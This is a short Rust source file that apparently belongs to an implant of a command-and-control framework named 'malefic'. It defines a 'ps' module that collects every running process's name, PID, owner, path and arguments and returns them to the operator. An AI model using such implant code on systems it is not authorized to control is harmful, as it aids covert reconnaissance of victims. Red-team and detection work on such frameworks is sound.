use malefic_proto::proto::modulepb;
use malefic_proto::proto::modulepb::PsResponse;
use crate::prelude::*;

pub struct Ps {}

#[async_trait]
#[module_impl("ps")]
impl Module for Ps {}

#[async_trait]
impl ModuleImpl for Ps {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let _ = check_request!(receiver, Body::Request)?;
        
        let mut response = PsResponse::default();
        for (_, process) in malefic_helper::common::process::get_processes()?.into_iter(){
            response.processes.push(modulepb::Process{
                name: process.name,
                pid: process.pid,
                ppid: process.ppid,
                arch: process.arch,
                owner: process.owner,
                path: process.path,
                args: process.args,
                uid: "".to_string(),
            });
        }

        Ok(TaskResult::new_with_body(id, Body::PsResponse(response))) // 响应体为空
    }
}